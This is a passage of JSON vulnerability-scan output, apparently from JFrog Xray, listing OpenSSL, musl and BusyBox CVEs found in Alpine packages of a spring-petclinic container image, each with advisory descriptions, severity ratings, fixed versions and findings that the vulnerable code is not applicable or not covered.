for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.3.1-r1"
            ],
            "fixed_versions": [
               "3.3.1-r1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-5535"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-5535",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-5535",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607877",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "alpine",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.3.1-r1"
            ],
            "fixed_versions": [
               "3.3.1-r1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-5535"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-5535",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-5535",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-670912",
         "severity": "Unknown",
         "jfrog_severity": "Medium",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:musl",
         "source_id": "alpine://3.14:musl",
         "source_comp_id": "alpine://3.14:musl:1.2.2-r3",
         "component_versions": {
            "id": "3.14:musl",
            "vulnerable_versions": [
               "< 1.2.5-r10"
            ],
            "fixed_versions": [
               "1.2.5-r10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-26519"
                  }
               ],
               "description": "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-670912",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bound write vulnerability in Musl Libc can lead to denial of service when using a specific character set.",
            "FullDescription": "musl is a C standard library intended for operating systems based on the Linux kernel. Most notably, it is the default libc implementation used in the popular Alpine Linux distribution.\nEUC-KR (Extended Unix Code for Korean) is a character encoding system used primarily for the Korean language.\n\nThe vulnerability was introduced in Musl Libc versions 0.9.13 through 1.2.5 in the `iconv()` function.\nAttackers can use the out-of-bounds write vulnerability by overflowing the buffer passed to the `iconv()` function and potentially overwriting the neighboring variables or crashing the application.\n\nTo successfully exploit this CVE, applications must call `iconv_open()` with an output encoding of UTF-8 and input encoding of `EUC-KR` and call `iconv()` with user-controlled input.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Currently there is no POC that can lead to code execution or even denial of service. Although memory corruption is possible, it is unproven whether it can lead to code execution.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applicability of this CVE requires applications to call `iconv_open` with an output encoding of UTF-8 and input encoding of EUC-KR and then use the returned value (`iconv` descriptor) as the first argument to the `iconv()` function. Additionally, `iconv()` should be called with user-controlled input.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://git.musl-libc.org/cgit/musl/commit/?id=e5adcd97b5196e29991b524237381a0202a60659",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:musl:1.2.2-r3",
            "cve_id": "CVE-2025-26519",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function iconv were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:musl:1.2.2-r3",
            "vulnerability_id": "CVE-2025-26519",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-670912",
         "severity": "Unknown",
         "jfrog_severity": "Medium",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:musl-utils",
         "source_id": "alpine://3.14:musl-utils",
         "source_comp_id": "alpine://3.14:musl:1.2.2-r3",
         "component_versions": {
            "id": "3.14:musl-utils",
            "vulnerable_versions": [
               "< 1.2.5-r10"
            ],
            "fixed_versions": [
               "1.2.5-r10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-26519"
                  }
               ],
               "description": "musl libc 0.9.13 through 1.2.5 before 1.2.6 has an out-of-bounds write vulnerability when an attacker can trigger iconv conversion of untrusted EUC-KR text to UTF-8.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-670912",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bound write vulnerability in Musl Libc can lead to denial of service when using a specific character set.",
            "FullDescription": "musl is a C standard library intended for operating systems based on the Linux kernel. Most notably, it is the default libc implementation used in the popular Alpine Linux distribution.\nEUC-KR (Extended Unix Code for Korean) is a character encoding system used primarily for the Korean language.\n\nThe vulnerability was introduced in Musl Libc versions 0.9.13 through 1.2.5 in the `iconv()` function.\nAttackers can use the out-of-bounds write vulnerability by overflowing the buffer passed to the `iconv()` function and potentially overwriting the neighboring variables or crashing the application.\n\nTo successfully exploit this CVE, applications must call `iconv_open()` with an output encoding of UTF-8 and input encoding of `EUC-KR` and call `iconv()` with user-controlled input.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Currently there is no POC that can lead to code execution or even denial of service. Although memory corruption is possible, it is unproven whether it can lead to code execution.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applicability of this CVE requires applications to call `iconv_open` with an output encoding of UTF-8 and input encoding of EUC-KR and then use the returned value (`iconv` descriptor) as the first argument to the `iconv()` function. Additionally, `iconv()` should be called with user-controlled input.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://git.musl-libc.org/cgit/musl/commit/?id=e5adcd97b5196e29991b524237381a0202a60659",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:musl:1.2.2-r3",
            "cve_id": "CVE-2025-26519",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function iconv were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:musl:1.2.2-r3",
            "vulnerability_id": "CVE-2025-26519",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-632766",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.3.0-r3"
            ],
            "fixed_versions": [
               "3.3.0-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-4741"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-4741",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-4741",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-632766",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.3.0-r3"
            ],
            "fixed_versions": [
               "3.3.0-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-4741"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-4741",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-4741",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-190220",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An attacker-controlled pointer free in Busybox's hush applet leads to denial of service and possible code execution when processing a crafted shell command, due to the shell mishandling the &&& string. This may be used for remote code execution under rare conditions of filtered command input.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "1.33.0-r0 ≤ Version ≤ 1.33.1-r8"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42377",
                     "cwe": [
                        "CWE-763"
                     ],
                     "cwe_details": {
                        "CWE-763": {
                           "name": "Release of Invalid Pointer or Reference",
                           "description": "The product attempts to return a memory resource to the system, but it calls the wrong release function or calls the appropriate release function incorrectly."
                        }
                     },
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An attacker-controlled pointer free in Busybox's hush applet leads to denial of service and possible code execution when processing a crafted shell command, due to the shell mishandling the &&& string. This may be used for remote code execution under rare conditions of filtered command input.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190220",
            "VulnerabilityTitle": "",
            "ShortDescription": "An attacker-controlled pointer free in Busybox hush leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn attacker-controlled pointer free in `hush` leads to denial of service and possible code execution when processing a crafted shell command, due to the shell mishandling the &&& string. This may be used for remote code execution under rare conditions of filtered command input.\nAn attacker that controls `hush` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_HUSH=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "`hush` command line argument control usually leads directly to RCE, without needing to exploit an additional pointer free. The issue is mostly relevant if the attacker can control the arguments, but they are filtered before being passed to `hush`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42377",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190220",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An attacker-controlled pointer free in Busybox's hush applet leads to denial of service and possible code execution when processing a crafted shell command, due to the shell mishandling the &&& string. This may be used for remote code execution under rare conditions of filtered command input.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "1.33.0-r0 ≤ Version ≤ 1.33.1-r8"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42377",
                     "cwe": [
                        "CWE-763"
                     ],
                     "cwe_details": {
                        "CWE-763": {
                           "name": "Release of Invalid Pointer or Reference",
                           "description": "The product attempts to return a memory resource to the system, but it calls the wrong release function or calls the appropriate release function incorrectly."
                        }
                     },
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An attacker-controlled pointer free in Busybox's hush applet leads to denial of service and possible code execution when processing a crafted shell command, due to the shell mishandling the &&& string. This may be used for remote code execution under rare conditions of filtered command input.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190220",
            "VulnerabilityTitle": "",
            "ShortDescription": "An attacker-controlled pointer free in Busybox hush leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn attacker-controlled pointer free in `hush` leads to denial of service and possible code execution when processing a crafted shell command, due to the shell mishandling the &&& string. This may be used for remote code execution under rare conditions of filtered command input.\nAn attacker that controls `hush` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_HUSH=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "`hush` command line argument control usually leads directly to RCE, without needing to exploit an additional pointer free. The issue is mostly relevant if the attacker can control the arguments, but they are filtered before being passed to `hush`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42377",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-529062",
         "severity": "Critical",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "There is a stack overflow vulnerability in ash.c:6030 in busybox before 1.35. In the environment of Internet of Vehicles, this vulnerability can be executed from command to arbitrary code execution.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.36.1-r2"
            ],
            "fixed_versions": [
               "1.36.1-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-48174",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
